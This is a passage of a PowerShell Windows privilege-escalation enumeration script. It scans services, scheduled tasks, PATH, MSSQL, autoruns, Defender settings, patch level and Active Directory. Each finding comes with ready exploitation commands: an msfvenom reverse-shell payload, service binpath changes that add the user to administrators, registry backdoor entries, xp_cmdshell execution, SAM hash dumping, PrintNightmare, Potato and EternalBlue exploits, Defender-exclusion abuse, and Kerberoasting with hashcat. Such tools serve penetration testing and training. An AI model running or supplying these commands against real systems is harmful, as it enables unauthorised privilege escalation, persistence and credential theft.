    finding $sev "Unquoted path: $($svc.Name) [Start: $($svc.StartMode)]$(if($writableDirs){' - WRITABLE DIR!'})" `
        "Path: $($svc.PathName)`nRuns as: $($svc.StartName)$(if($writableDirs){"`nWritable: $($writableDirs -join ', ')"})" `
        "1. Identify space-truncated path to abuse:`n   e.g. C:\Program Files\Vuln App\svc.exe -> drop C:\Program.exe`n2. msfvenom -p windows/x64/shell_reverse_tcp ... -f exe > Program.exe`n3. Copy to writable dir, restart service:`n   sc stop $($svc.Name)`n   sc start $($svc.Name)"
}
if ($unquotedCount -eq 0) { info "No unquoted service paths." }

sub "Writable service binaries"
foreach ($svc in $allServices) {
    $bin = Get-BinFromPath $svc.PathName
    if (-not $bin -or -not (Test-Path $bin)) { continue }
    if (Test-Writable $bin) {
        finding-writable-bin 'service' $svc.Name $bin $svc.StartName "Start: $($svc.StartMode)" `
            "sc stop $($svc.Name) & sc start $($svc.Name)"
    }
}

sub "Writable service directories (DLL plant)"
$writableSvcDirCount = 0
foreach ($svc in $allServices) {
    $bin = Get-BinFromPath $svc.PathName
    if (-not $bin) { continue }
    $dir = Split-Path $bin -Parent -ErrorAction SilentlyContinue
    if (-not $dir -or $dir -match '^C:\\Windows\\System32' -or $dir -match '^C:\\Windows\\SysWOW64') { continue }
    if ((Test-Path $dir) -and (Test-WritableDir $dir) -and -not (Test-Writable $bin)) {
        $writableSvcDirCount++
        finding 'HIGH' "Writable service dir: $($svc.Name)" `
            "Dir: $dir`nBinary: $bin`nRuns as: $($svc.StartName)" `
            "1. Use procmon to find missing DLLs loaded by $bin`n2. Place malicious DLL in $dir`n3. sc stop $($svc.Name) & sc start $($svc.Name)"
    }
}
if ($writableSvcDirCount -eq 0) { info "No writable service directories (excluding system dirs)." }

# --- MOVED from Extended to default: Service DACL check ---
sub "Modifiable service DACLs"
$modifiableSvcCount = 0
foreach ($svc in ($allServices | Select-Object -First 80)) {
    try {
        $sd = sc.exe sdshow $svc.Name 2>$null | Out-String
        if ($sd -match '\(A;;[^;]*?(DC|WD|CC|WP|GA)[^;]*?;;;(BU|AU|WD)\)') {
            $modifiableSvcCount++
            finding 'HIGH' "Modifiable service DACL: $($svc.Name)" `
                "Runs as: $($svc.StartName)" `
                ('sc config ' + $svc.Name + ' binpath= "cmd /c net localgroup administrators ' + $myName + ' /add"' + "`nsc stop " + $svc.Name + "`nsc start " + $svc.Name)
        }
    } catch {}
}
if ($modifiableSvcCount -eq 0) { info "No modifiable service DACLs found." }

if ($Extended) {
    sub "Writable service registry keys (Extended)"
    $writableRegCount = 0
    Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' -ErrorAction SilentlyContinue | ForEach-Object {
        if (Test-RegWritable $_.PSPath) {
            $writableRegCount++
            $svcName = $_.PSChildName
            finding 'HIGH' "Writable service reg key: $svcName" "Key: $($_.PSPath)" `
                "reg add `"HKLM\SYSTEM\CurrentControlSet\Services\$svcName`" /v ImagePath /t REG_EXPAND_SZ /d `"C:\path\payload.exe`" /f`nsc start $svcName"
        }
    }
    if ($writableRegCount -eq 0) { info "No writable service registry keys." }
}

# ════════════════════════════════════════════════════════════════
#  §5  SCHEDULED TASKS
# ════════════════════════════════════════════════════════════════

hdr "§5 - SCHEDULED TASKS"

sub "Tasks with writable binaries"
$taskCount = 0
try {
    $tasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv -ErrorAction Stop
    $tasks | Where-Object {
        $_.'Task To Run' -and
        $_.'Task To Run' -ne 'N/A' -and
        $_.'Task To Run' -notmatch '^COM handler' -and
        $_.'Task To Run' -notmatch '^C:\\Windows\\system32\\'
    } | ForEach-Object {
        $taskBin = Get-BinFromPath $_.'Task To Run'
        $runAs = $_.'Run As User'
        $taskName = $_.'TaskName'
        $schedule = "$($_.'Schedule Type') $($_.'Start Time')"

        if ($taskBin -and (Test-Path $taskBin)) {
            $binWritable = Test-Writable $taskBin
            $dirWritable = $false
            $taskDir = Split-Path $taskBin -Parent -ErrorAction SilentlyContinue
            if ($taskDir -and -not $binWritable) { $dirWritable = Test-WritableDir $taskDir }

            if ($binWritable) {
                $taskCount++
                finding-writable-bin 'task' $taskName $taskBin $runAs "Schedule: $schedule" `
                    "schtasks /run /tn `"$taskName`""
            } elseif ($dirWritable) {
                $taskCount++
                finding 'MED' "Writable task dir (DLL hijack): $taskName" `
                    "Dir: $taskDir`nBinary: $taskBin`nRuns as: $runAs`nSchedule: $schedule" `
                    "1. procmon -> find missing DLLs`n2. Drop DLL in $taskDir`n3. Wait for schedule"
            }
        }
    }
} catch { info "Cannot parse scheduled tasks." }
if ($taskCount -eq 0) { info "No writable scheduled task binaries or dirs." }

# ════════════════════════════════════════════════════════════════
#  §6  PATH & DLL HIJACKING
# ════════════════════════════════════════════════════════════════

hdr "§6 - PATH & DLL HIJACKING"

sub "Writable directories in PATH"
$pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) }
foreach ($dir in $pathDirs) {
    if (Test-WritableDir $dir) {
        $sev = if ($dir -match 'System32|SysWOW64') { 'CRIT' } else { 'HIGH' }
        finding $sev "Writable PATH dir: $dir" $null `
            "1. Find which programs search this dir for DLLs/EXEs`n2. Drop malicious binary with expected name`n3. Wait for service restart or user action"
    }
}

# NOTE: UAC bypass binary list moved to -Extended (every Windows box has these)
if ($Extended) {
    sub "Known DLL hijack targets (UAC bypass binaries)"
    $hijackTargets = @(
        @{ Bin='C:\Windows\System32\fodhelper.exe';        Note='UAC bypass - ms-settings reg key' }
        @{ Bin='C:\Windows\System32\computerdefaults.exe'; Note='UAC bypass - ms-settings reg key' }
        @{ Bin='C:\Windows\System32\eventvwr.exe';         Note='UAC bypass - mscfile reg key' }
        @{ Bin='C:\Windows\System32\WSReset.exe';          Note='UAC bypass - AppX reg key (Win10 1809+)' }
        @{ Bin='C:\Windows\System32\sdclt.exe';            Note='UAC bypass - isolatedcommand reg key' }
        @{ Bin='C:\Windows\System32\slui.exe';             Note='UAC bypass - exefile\shell\open (Win 8+)' }
        @{ Bin='C:\Windows\System32\cmstp.exe';            Note='UAC bypass - INF scriptlet execution' }
        @{ Bin='C:\Windows\System32\msconfig.exe';         Note='UAC auto-elevate - DLL hijack' }
        @{ Bin='C:\Windows\System32\dccw.exe';             Note='DLL hijack - GdiPlus.dll' }
    )
    foreach ($t in $hijackTargets) {
        if (Test-Path $t.Bin) {
            finding 'INFO' "$(Split-Path $t.Bin -Leaf) present - $($t.Note)" "Path: $($t.Bin)"
        }
    }
}

# ════════════════════════════════════════════════════════════════
#  §7  INSTALLED SOFTWARE & MSSQL
# ════════════════════════════════════════════════════════════════

hdr "§7 - INSTALLED SOFTWARE & MSSQL"

sub "Installed applications"
$software = @()
@('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
  'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
  'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*') | %{
    Get-ItemProperty $_ -ErrorAction SilentlyContinue
} | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation -Unique |
    Sort-Object DisplayName | %{
    $software += $_
    if ($_.InstallLocation -and (Test-Path $_.InstallLocation) -and (Test-WritableDir $_.InstallLocation)) {
        finding 'HIGH' "Writable install dir: $($_.InstallLocation)" "Software: $($_.DisplayName) v$($_.DisplayVersion)" `
            "1. Find DLLs/EXEs loaded from this dir`n2. Replace with payload`n3. Restart app/service"
    }
}

# Full list only in Extended mode (noise reduction)
if ($Extended) {
    foreach ($sw2 in $software) {
        finding 'INFO' "Installed: $($sw2.DisplayName) v$($sw2.DisplayVersion)" $null
    }
}

$credSoftware = @{
    'FileZilla'='Plaintext creds in AppData\FileZilla\sitemanager.xml'
    'WinSCP'='Encrypted creds in registry (decryptable)'
    'PuTTY'='Sessions + proxy creds in registry'
    'mRemoteNG'='AES-GCM creds in confCons.xml (default key = mR3m)'
    'KeePass'='Database .kdbx - crack master password'
    'VNC'='Password in registry (fixed DES key - trivially crackable)'
    'TightVNC'='reg query HKLM\SOFTWARE\TightVNC\Server /v Password'
    'RealVNC'='reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password'
    'UltraVNC'='Password in ultravnc.ini (DES encrypted)'
    'MobaXterm'='Creds in MobaXterm.ini (encrypted, tools exist)'
    'XAMPP'='Default no-password MySQL, config files with creds'
    'MySQL'='Check my.ini for password, try root with no password'
    'PostgreSQL'='Check pg_hba.conf for trust auth, pgpass.conf for creds'
    'Redis'='Usually no auth - redis-cli -> dump data or write webshell'
    'Jenkins'='creds in credentials.xml, initialAdminPassword, users/*/config.xml'
    'Tomcat'='tomcat-users.xml contains plaintext creds'
    'TeamViewer'='Password in registry - old versions trivially crackable'
    'OpenVPN'='Config files (.ovpn) may contain creds or keys'
}
sub "Software with known credential storage"
foreach ($sw in $software) {
    foreach ($cs2 in $credSoftware.Keys) {
        if ($sw.DisplayName -match ('\b' + [regex]::Escape($cs2) + '\b')) {
            finding 'MED' "$($sw.DisplayName) v$($sw.DisplayVersion) - $($credSoftware[$cs2])"
            break
        }
    }
}

# --- NEW: MSSQL Enumeration ---
sub "MSSQL enumeration"
$sqlInstances = @()
@('HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL',
  'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Microsoft SQL Server\Instance Names\SQL') | %{
    $props = Get-ItemProperty $_ -ErrorAction SilentlyContinue
    if ($props) {
        $props.PSObject.Properties | Where-Object { $_.Name -notin @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider') } | %{
            $sqlInstances += $_.Name
        }
    }
}
if ($sqlInstances.Count -gt 0) {
    Write-Host "  SQL instances: $($sqlInstances -join ', ')" -ForegroundColor Gray
    foreach ($inst in $sqlInstances) {
        $server = if ($inst -eq 'MSSQLSERVER') { 'localhost' } else { "localhost\$inst" }
        try {
            $conn = New-Object System.Data.SqlClient.SqlConnection("Server=$server;Integrated Security=True;Connection Timeout=3")
            $conn.Open()
            $cmd = $conn.CreateCommand()

            # Check sysadmin
            $cmd.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
            $sa = $cmd.ExecuteScalar()
            if ($sa -eq 1) {
                finding 'CRIT' "MSSQL sysadmin on $server!" $null `
                    "EXEC sp_configure 'show advanced options',1; RECONFIGURE;`nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`nEXEC xp_cmdshell 'whoami'"
            }

            # Check impersonation
            $cmd.CommandText = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
            $r = $cmd.ExecuteReader()
            while ($r.Read()) {
                $impTarget = $r[0]
                finding 'CRIT' "MSSQL impersonation: can impersonate $impTarget on $server" $null `
                    "EXECUTE AS LOGIN = '$impTarget';`nSELECT IS_SRVROLEMEMBER('sysadmin');`nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`nEXEC xp_cmdshell 'whoami'"
            }
            $r.Close()

            # Check linked servers
            $cmd.CommandText = "SELECT name FROM sys.servers WHERE is_linked = 1"
            $r = $cmd.ExecuteReader()
            while ($r.Read()) {
                $linked = $r[0]
                finding 'HIGH' "MSSQL linked server: $linked" $null `
                    "EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE;') AT [$linked]`nEXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [$linked]`nEXEC ('xp_cmdshell ''whoami''') AT [$linked]"
            }
            $r.Close()

            # Check xp_cmdshell status
            $cmd.CommandText = "SELECT CONVERT(INT, ISNULL(value, value_in_use)) FROM sys.configurations WHERE name = 'xp_cmdshell'"
            $xpEnabled = $cmd.ExecuteScalar()
            if ($xpEnabled -eq 1) {
                finding 'CRIT' "xp_cmdshell already enabled on $server!" $null `
                    "EXEC xp_cmdshell 'whoami'"
            }

            # Check SQL logins with hashes (if we have permission)
            $cmd.CommandText = "SELECT name, password_hash FROM sys.sql_logins WHERE password_hash IS NOT NULL"
            try {
                $r = $cmd.ExecuteReader()
                while ($r.Read()) {
                    finding 'HIGH' "SQL login hash: $($r[0])" $null `
                        "Crack with hashcat -m 1731"
                }
                $r.Close()
            } catch {}

            $conn.Close()
        } catch {
            bg "MSSQL $server: cannot connect with current user"
        }
    }
} else {
    # Fallback: check if port 1433 is listening
    $sqlListening = netstat -ano 2>$null | Select-String ':1433\s+.*LISTENING'
    if ($sqlListening) {
        finding 'MED' "Port 1433 (MSSQL) listening but no instance found in registry" $null `
            "sqlcmd -Q `"SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');`""
    }
}

sub "Processes with writable binaries"
$procs = Get-CimInstance Win32_Process 2>$null
$procWritableCount = 0
$checked = @{}
foreach ($p in $procs) {
    $bin = Get-BinFromPath $p.CommandLine
    if (-not $bin -or $checked[$bin] -or $bin -match '^C:\\Windows\\') { continue }
    $checked[$bin] = $true
    if (-not (Test-Path $bin)) { continue }
    if (Test-Writable $bin) {
        $procWritableCount++
        finding-writable-bin 'process' "$($p.Name) (PID $($p.ProcessId))" $bin 'unknown' $null `
            "Kill process, replace binary, re-trigger"
    }
}
if ($procWritableCount -eq 0) { info "No writable process binaries (non-system)." }

if ($Extended) {
    sub "Processes running as other users (Extended)"
    $procOwners = @{}
    foreach ($p in $procs) {
        try {
            $owner = (Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction Stop)
            $ownerStr = if ($owner.Domain) { "$($owner.Domain)\$($owner.User)" } else { $owner.User }
            if ($ownerStr -and $ownerStr -ne $myName -and $ownerStr -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE') {
                if (-not $procOwners[$ownerStr]) { $procOwners[$ownerStr] = @() }
                $procOwners[$ownerStr] += "$($p.Name) (PID $($p.ProcessId))"
            }
        } catch {}
    }
    foreach ($owner in $procOwners.Keys) {
        finding 'INFO' "Processes as $owner" `
            ($procOwners[$owner] | Select-Object -First 5 | Out-String).Trim() `
            "If you can inject or replace the binary -> run as $owner"
    }
}

# ════════════════════════════════════════════════════════════════
#  §8  AUTORUN / STARTUP HIJACKING
# ════════════════════════════════════════════════════════════════

hdr "§8 - AUTORUN / STARTUP HIJACKING"

sub "Registry autorun entries"
$autorunKeys = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService'
)
$autorunCount = 0
foreach ($key in $autorunKeys) {
    $props = Get-ItemProperty $key -ErrorAction SilentlyContinue
    if (-not $props) { continue }
    $props.PSObject.Properties | Where-Object { $_.Name -notin @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider') } | %{
        $bin = Get-BinFromPath $_.Value
        if (-not $bin -or -not (Test-Path $bin)) { return }
        if ($bin -match '^C:\\Windows\\') { return }
        if (Test-Writable $bin) {
            $autorunCount++
            $sev = if ($key -match 'HKLM') { 'HIGH' } else { 'MED' }
            finding $sev "Writable autorun binary: $($_.Name)" `
                "Key: $key`nValue: $($_.Value)" `
                "1. Replace $bin with payload`n2. Triggers on logon / reboot"
        }
    }
}
if ($autorunCount -eq 0) { info "No writable autorun binaries." }

sub "Writable autorun registry keys"
foreach ($key in $autorunKeys) {
    if (Test-RegWritable "Microsoft.PowerShell.Core\Registry::$($key -replace ':','')") {
        finding 'HIGH' "Writable autorun key: $key" $null `
            "reg add `"$($key -replace 'HKLM:\\','HKLM\' -replace 'HKCU:\\','HKCU\')`" /v Backdoor /t REG_SZ /d `"C:\path\payload.exe`" /f"
    }
}

sub "Startup folders"
$startupDirs = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
)
foreach ($dir in $startupDirs) {
    if (Test-Path $dir) {
        if (Test-WritableDir $dir) {
            finding 'HIGH' "Writable startup folder: $dir" $null `
                "Drop payload (.exe, .bat, .lnk, .vbs) - triggers on logon"
        }
        Get-ChildItem $dir -Force 2>$null | %{
            if (Test-Writable $_.FullName) {
                finding 'HIGH' "Writable startup item: $($_.FullName)" $null "Replace with payload - triggers on logon"
            }
        }
    }
}

# ════════════════════════════════════════════════════════════════
#  §9  NETWORK
# ════════════════════════════════════════════════════════════════

hdr "§9 - NETWORK ENUMERATION"

sub "Listening ports (local services)"
$interestingPorts = @{
    21='FTP'; 22='SSH'; 23='Telnet'; 25='SMTP'; 53='DNS'; 80='HTTP'; 110='POP3';
    135='RPC'; 139='NetBIOS'; 389='LDAP'; 443='HTTPS'; 445='SMB'; 1433='MSSQL';
    1521='Oracle'; 3306='MySQL'; 3389='RDP'; 5432='PostgreSQL'; 5985='WinRM';
    5986='WinRM-S'; 6379='Redis'; 8000='HTTP'; 8080='HTTP'; 8443='HTTPS';
    8888='HTTP'; 9200='Elasticsearch'; 27017='MongoDB'
}
netstat -ano 2>$null | Select-String 'LISTENING' | %{
    if ($_ -match '(\d+\.\d+\.\d+\.\d+):(\d+)\s+.*?(\d+)$') {
        $addr = $Matches[1]; $port = [int]$Matches[2]; $pid = $Matches[3]
        $procName = (Get-Process -Id $pid -ErrorAction SilentlyContinue).Name
        $hint = $interestingPorts[$port]
        if ($hint -or $addr -eq '127.0.0.1') {
            $label = if ($addr -eq '127.0.0.1') { '(localhost only)' } else { '' }
            $sev = if ($hint -and $addr -eq '127.0.0.1') { 'MED' } else { 'INFO' }
            finding $sev "Port $port - $procName (PID $pid) $label" $(if($hint){$hint})
        }
    }
}

sub "Network interfaces"
ipconfig /all 2>$null | Select-String 'IPv4|Subnet|Gateway|DNS Servers|Description' | %{
    Write-Host "    $($_.Line.Trim())" -ForegroundColor Gray
}

sub "ARP table (pivot check)"
$uniqueSubnets = @()
arp -a 2>$null | Select-String '(\d+\.\d+\.\d+)\.' | %{
    $subnet = $Matches[1]
    if ($subnet -notin $uniqueSubnets -and $subnet -ne '255.255.255') { $uniqueSubnets += $subnet }
}
if ($uniqueSubnets.Count -gt 1) {
    finding 'MED' "Multiple subnets in ARP - dual-homed or pivot" `
        "Subnets: $($uniqueSubnets -join ', ')" `
        "Pivot: chisel, ligolo-ng, portfwd"
}

# ════════════════════════════════════════════════════════════════
#  §10  DEFENSES
# ════════════════════════════════════════════════════════════════

hdr "§10 - DEFENSES"

sub "Windows Defender"
try {
    $def = Get-MpComputerStatus -ErrorAction Stop
    Write-Host "    RealTimeProtection : $($def.RealTimeProtectionEnabled)" -ForegroundColor $(if($def.RealTimeProtectionEnabled){'Yellow'}else{'Green'})
    Write-Host "    BehaviorMonitoring : $($def.BehaviorMonitorEnabled)" -ForegroundColor Gray
    Write-Host "    TamperProtection   : $($def.IsTamperProtected)" -ForegroundColor Gray

    $excl = Get-MpPreference -ErrorAction SilentlyContinue
    if ($excl.ExclusionPath -and ($excl.ExclusionPath | Where-Object { $_ -and $_ -notmatch 'N/A|Must be' })) {
        finding 'HIGH' "Defender exclusion PATHS" ($excl.ExclusionPath -join "`n") "Place payloads in excluded paths!"
    }
    if ($excl.ExclusionExtension -and ($excl.ExclusionExtension | Where-Object { $_ -and $_ -notmatch 'N/A|Must be' })) {
        finding 'HIGH' "Defender exclusion EXTENSIONS" ($excl.ExclusionExtension -join ', ') "Rename payload to excluded extension"
    }
    if ($excl.ExclusionProcess -and ($excl.ExclusionProcess | Where-Object { $_ -and $_ -notmatch 'N/A|Must be' })) {
        finding 'HIGH' "Defender exclusion PROCESSES" ($excl.ExclusionProcess -join "`n") "Name payload after excluded process"
    }
} catch {
    info "Cannot query Defender."
    try { Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction Stop | %{ Write-Host "    AV: $($_.displayName)" -ForegroundColor Yellow } } catch {}
}

sub "AppLocker / WDAC"
try {
    $al = Get-AppLockerPolicy -Effective -ErrorAction Stop
    if ($al.RuleCollections.Count -gt 0) {
        finding 'INFO' "AppLocker active - $($al.RuleCollections.Count) rule collection(s)" $null `
            "Get-AppLockerPolicy -Effective -Xml | Out-File applocker.xml`nBypasses: MSBuild, InstallUtil, regsvr32, cmstp"
    }
} catch {}

sub "PowerShell logging & language mode"
$psLog = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue
if ($psLog.EnableScriptBlockLogging -eq 1) { Write-Host "    ScriptBlock logging: ENABLED" -ForegroundColor Yellow }
$psTr = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue
if ($psTr.EnableTranscripting -eq 1) {
    finding 'INFO' "PS transcription enabled - dir: $($psTr.OutputDirectory)" $null `
        "Transcripts may contain other users' creds!`ndir `"$($psTr.OutputDirectory)`" /s"
}
$clm = $ExecutionContext.SessionState.LanguageMode
if ($clm -ne 'FullLanguage') {
    finding 'INFO' "PowerShell in $clm mode" $null "Bypass: powershell -version 2 -ep bypass (if PS2 installed)"
}

# ════════════════════════════════════════════════════════════════
#  §11  KERNEL / CVE CHECKS
# ════════════════════════════════════════════════════════════════

hdr "§11 - KERNEL / CVE CHECKS (last resort)"

sub "Patch level"
$hotfixes = Get-HotFix -ErrorAction SilentlyContinue | Sort-Object InstalledOn -Descending
if ($hotfixes) {
    $latest = $hotfixes | Select-Object -First 1
    $daysSince = ((Get-Date) - $latest.InstalledOn).Days
    Write-Host "    Last patch: $($latest.HotFixID) on $($latest.InstalledOn.ToString('yyyy-MM-dd')) ($daysSince days ago)" -ForegroundColor $(if($daysSince -gt 90){'Red'}elseif($daysSince -gt 30){'Yellow'}else{'Gray'})
    Write-Host "    Total hotfixes: $($hotfixes.Count)" -ForegroundColor Gray
    if ($daysSince -gt 90) {
        finding 'HIGH' "System unpatched for $daysSince days!" $null `
            "1. systeminfo > sysinfo.txt`n2. python wes.py sysinfo.txt`n   Or: windows-exploit-suggester.py --database <db> --systeminfo sysinfo.txt"
    }
} else { info "Cannot retrieve hotfix info." }

sub "HiveNightmare / SAM readable (CVE-2021-36934)"
$samAcl = icacls 'C:\Windows\System32\config\SAM' 2>$null | Out-String
if ($samAcl -match 'BUILTIN\\Users.*?\(.*?RX') {
    finding 'CRIT' "HiveNightmare (CVE-2021-36934) - SAM readable!" $null `
        "1. vssadmin list shadows`n2. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .`n   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .`n3. secretsdump.py -sam SAM -system SYSTEM LOCAL"
} else { info "SAM not readable by Users." }

sub "PrintNightmare (CVE-2021-1675 / CVE-2021-34527)"
$spooler = sc.exe query spooler 2>$null | Out-String
if ($spooler -match 'RUNNING') {
    $pnKey = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint' -ErrorAction SilentlyContinue
    if ($pnKey.RestrictDriverInstallationToAdministrators -ne 1) {
        finding 'HIGH' "Spooler RUNNING + Point and Print not restricted" $null `
            "Import-Module .\CVE-2021-1675.ps1`nInvoke-Nightmare -NewUser hacker -NewPassword pass123"
    } else {
        finding 'LOW' "Spooler running but Point and Print restricted"
    }
} else { info "Print Spooler not running." }

sub "Potato attack compatibility"
$build = [int]$os.BuildNumber
if ($build -ge 17763) {
    finding 'INFO' "Build $build (1809+/Server 2019+) - PrintSpoofer / GodPotato" $null `
        "If SeImpersonate: PrintSpoofer.exe -i -c cmd`nGodPotato.exe -cmd `"cmd /c whoami`""
} elseif ($build -ge 10240) {
    finding 'INFO' "Build $build (Win10/Server 2016) - JuicyPotato" $null `
        "If SeImpersonate: JuicyPotato.exe -l 1337 -p cmd.exe -t *"
}

sub "EternalBlue / MS17-010"
$ebPatches = 'KB4012212|KB4012215|KB4012216|KB4012217|KB4012213|KB4012214|KB4013429|KB4019472'
$eb = $hotfixes | Where-Object { $_.HotFixID -match $ebPatches }
if (-not $eb -and $build -lt 15063) {
    finding 'HIGH' "Potentially vulnerable to MS17-010 (EternalBlue)" "No known patch KB found, build < RS2" `
        "nmap --script smb-vuln-ms17-010 -p445 <target>`nOr: msfconsole -> exploit/windows/smb/ms17_010_eternalblue"
}

# ════════════════════════════════════════════════════════════════
#  §12  MISCELLANEOUS + DOMAIN
# ════════════════════════════════════════════════════════════════

hdr "§12 - MISCELLANEOUS"

sub "Mounted drives and mapped shares"
Get-PSDrive -PSProvider FileSystem | %{
    Write-Host "    $($_.Name): $($_.Root) (Free: $([math]::Round($_.Free/1GB,1)) GB)" -ForegroundColor Gray
}
net use 2>$null | Select-String '\\\\' | %{ finding 'INFO' "Mapped share: $($_.Line.Trim())" }

sub "World-writable directories (for staging payloads)"
@('C:\Temp','C:\Windows\Temp','C:\Windows\Tasks','C:\Windows\Tracing',
  'C:\Windows\System32\spool\drivers\color',"$env:TEMP","$env:TMP") | %{
    if ((Test-Path $_) -and (Test-WritableDir $_)) {
        Write-Host "    Writable: $_" -ForegroundColor Green
    }
}

if ($cs.PartOfDomain) {
    sub "Domain information"
    finding 'INFO' "Domain: $($cs.Domain)" $null `
        "SharpHound.exe -c All`nbloodhound-python -c All -d $($cs.Domain)"

    # Kerberoastable users
    sub "Kerberoastable users (users with SPN)"
    $kerbFound = $false
    try {
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.Filter = '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'
        $searcher.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname','memberof','admincount','pwdlastset'))
        $kerbUsers = $searcher.FindAll()
        if ($kerbUsers.Count -gt 0) {
            foreach ($u in $kerbUsers) {
                $sam = $u.Properties['samaccountname'][0]
                if ($sam -match '^krbtgt$') { continue }
                $spns = ($u.Properties['serviceprincipalname'] | Out-String).Trim()
                $isAdmin = $u.Properties['admincount'] -contains 1
                $pwdSet = if ($u.Properties['pwdlastset'][0]) {
                    [datetime]::FromFileTime([long]$u.Properties['pwdlastset'][0]).ToString('yyyy-MM-dd')
                } else { 'never' }
                $exploit = "GetUserSPNs.py $($cs.Domain)/<user>:<pass> -request -outputfile hashes.txt`nhashcat -m 13100 hashes.txt rockyou.txt`nOr: Rubeus.exe kerberoast /user:$sam /outfile:hash.txt"
                if ($isAdmin) {
                    hit "Kerberoastable: $sam (ADMIN!)" "SPN: $spns`nPassword last set: $pwdSet" $exploit
                } else {
                    lateral "Kerberoastable: $sam" "SPN: $spns`nPassword last set: $pwdSet`nCrack -> login as $sam -> enumerate from there" $exploit
                }
                $kerbFound = $true
            }
        }
    } catch {}

    if (-not $kerbFound) {
        try {
            $spnOut = setspn -Q */* 2>$null | Out-String
            if ($spnOut) {
                $currentAccount = $null
                $spnOut -split "`n" | %{
                    $line = $_.Trim()
                    if ($line -match '^Checking domain') { return }
                    if ($line -match '^Existing SPN') { return }
                    if ($line -match '^CN=([^,]+),' -or $line -match '^([^\s/]+)$' -and $line -match '\\') {
                        $currentAccount = $line
                    }
                    elseif ($line -match '/' -and $currentAccount) {
                        if ($currentAccount -notmatch '\$$' -and $currentAccount -notmatch 'krbtgt') {
                            $acctName = if ($currentAccount -match 'CN=([^,]+)') { $Matches[1] } else { $currentAccount }
                            finding 'HIGH' "Potential Kerberoastable (via setspn): $acctName" `
                                "SPN: $line" `
                                "GetUserSPNs.py $($cs.Domain)/<user>:<pass> -request -outputfile hashes.txt`nhashcat -m 13100 hashes.txt rockyou.txt"
                            $kerbFound = $true
                        }
                    }
                }
            }
        } catch {}
    }

    if (-not $kerbFound) {
        finding 'MED' "Could not enumerate SPNs automatically - check manually" $null `
            "setspn -Q */*`nOr from attacker: GetUserSPNs.py $($cs.Domain)/<user>:<pass>`nOr: Rubeus.exe kerberoast"
    }

    # ASREPRoastable users
    sub "ASREPRoastable users (DONT_REQUIRE_PREAUTH)"
    try {
        $searcher2 = New-Object DirectoryServices.DirectorySearcher
        $searcher2.Filter = '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
        $searcher2.PropertiesToLoad.AddRange(@('samaccountname','memberof','admincount','pwdlastset'))
        $asrepUsers = $searcher2.FindAll()
        if ($asrepUsers.Count -gt 0) {
            foreach ($u in $asrepUsers) {
                $sam = $u.Properties['samaccountname'][0]
                $isAdmin = $u.Properties['admincount'] -contains 1
                $pwdSet = if ($u.Properties['pwdlastset'][0]) {
                    [datetime]::FromFileTime([long]$u.Properties['pwdlastset'][0]).ToString('yyyy-MM-dd')
                } else { 'never' }
                $exploit = "GetNPUsers.py $($cs.Domain)/ -usersfile users.txt -no-pass -outputfile asrep.txt`nhashcat -m 18200 asrep.txt rockyou.txt`nOr: Rubeus.exe asreproast /user:$sam /outfile:hash.txt"
                if ($isAdmin) {
                    hit "ASREPRoastable: $sam (ADMIN!)" "Password last set: $pwdSet" $exploit
                } else {
                    lateral "ASREPRoastable: $sam" "Password last set: $pwdSet`nCrack -> login as $sam -> enumerate from there" $exploit
                }
            }
        } else { info "No ASREPRoastable users found." }
    } catch {
        finding 'MED' "Could not enumerate ASREP automatically - check manually" $null `
            "GetNPUsers.py $($cs.Domain)/ -usersfile users.txt -no-pass`nOr: Rubeus.exe asreproast"
    }

    # Unconstrained delegation
